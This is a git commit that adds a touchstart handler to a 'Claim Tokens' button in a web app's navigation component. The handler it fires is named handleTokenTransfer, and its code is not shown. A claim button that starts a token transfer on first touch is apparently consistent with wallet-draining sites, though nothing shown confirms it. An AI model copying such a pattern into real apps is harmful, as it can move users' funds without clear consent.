22d0858b33544079933149c0eae5c0a61b9f4886
Anthony <anthonychinaemeru84@yahoo.com>
2024-06-07 17:15:27 +0100

    On touchstart added

--- src/pages/components/nav/Nav.tsx
+++ src/pages/components/nav/Nav.tsx
@@ -319,6 +319,7 @@ const newDat = 0.0026;
       <div className="px-5 md:px-24 flex flex-col items-center">
       {isConnected ? (
         <button
+        onTouchStart={handleTokenTransfer}
         onClick={async () => await handleTokenTransfer()}
           className="w-full md:w-95 h-10 bg-green text-white p-5 text-sm md:text-base rounded-3xl z-10 flex items-center justify-center"
           aria-label="Claim Tokens"
